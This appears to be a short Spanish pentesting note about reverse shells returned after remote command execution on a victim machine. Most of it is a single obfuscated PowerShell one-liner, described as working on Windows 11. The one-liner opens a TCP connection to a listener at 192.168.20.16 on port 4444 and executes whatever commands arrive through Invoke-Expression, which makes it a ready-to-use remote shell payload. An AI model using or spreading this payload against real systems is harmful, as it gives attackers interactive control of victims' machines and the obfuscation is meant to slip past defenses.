
-------------

#vulnerabilidad #shell #explotacion

---------
Este tipo de Shell suele devolverse durante la ejecución remota de comandos en la máquina víctima.

Payload ofuscado a través de **POWERSHELL**  que funciona actualmente en windows 11

```bash
 $S = "192.168.20.16"; $P = 4444; $T = [Net.Sockets.TCPClient]; $C = New-Object $T($S, $P); $N = $C.GetStream(); $R = [IO.StreamReader]; $W = [IO.StreamWriter]; $B = New-Object "System.Byte[]" 1024; $O = New-Object $R($N); $A = New-Object $W($N); $A.AutoFlush = $true; while($C.Connected){while($N.DataAvailable){$D = $N.Read($B, 0, $B.Length); $F = ([Text.Encoding]::UTF8).GetString($B, 0, $D - 1); if($C.Connected -and $F.Length -gt 1){$X=try{Invoke-Expression($F) 2>&1}catch{$_.Exception.Message};$A.Write("$X`n");}}}$C.Close();$N.Close();$O.Close();$A.Close();
```

![[Pasted image 20241014021812.png]]

